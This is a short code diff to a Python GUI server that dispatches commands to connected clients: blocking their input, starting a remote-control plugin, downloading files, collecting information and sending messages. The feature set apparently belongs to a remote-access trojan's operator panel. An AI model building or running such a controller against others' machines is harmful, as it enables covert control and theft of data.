@@ -8,7 +8,7 @@ import threading
 from tkinter import messagebox, filedialog
 
 from config import load_settings, create_key
-from frames.plugins import console, remote_desktop
+from frames.plugins import console, remote_tool
 from frames import (settings, build_config, collect_info,
                     function, info)
 
@@ -121,10 +121,9 @@ class Server(ctk.CTk):
                         print(f'Download: {file}')
                         threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()
                     
-                    elif message == "remote_desktop":
-                        self.rem_desk = remote_desktop.RemoteDesktop()
-                        threading.Thread(target=self.rem_desk.start, daemon=True).start()
-
+                    elif message == "remote":
+                        self.remote = remote_tool.RemoteServer()
+                    
                 except Exception as e:
                     print(f"Error sending {ip}:{port}: {e}")
                 return
@@ -306,8 +305,8 @@ class CommandFunction:
     def block_input(self, ip, port):
         threading.Thread(target=self.server.send_to_client, args=(ip, port, 'block_input'), daemon=True).start()
 
-    def remote_desktop(self, ip, port):
-        threading.Thread(target=self.server.send_to_client, args=(ip, port,'remote_desktop'), daemon=True).start()
+    def remote_tool(self, ip, port):
+        threading.Thread(target=self.server.send_to_client, args=(ip, port,'remote'), daemon=True).start()
 
     def get_info(self, ip, port):
         threading.Thread(target=self.server.send_to_client, args=(ip, port, 'get_info'), daemon=True).start()
@@ -331,7 +330,7 @@ class CommandFunction:
     def download_file(self, ip, port, filename):
         threading.Thread(target=self.server.send_to_client, args=(ip, port, f'download {filename}'), daemon=True).start()
 
-    def kill_yourself(self, ip, port, msg):
+    def post_msg(self, ip, port, msg):
         threading.Thread(target=self.server.send_to_client, args=(ip, port, msg), daemon=True).start()
 
 
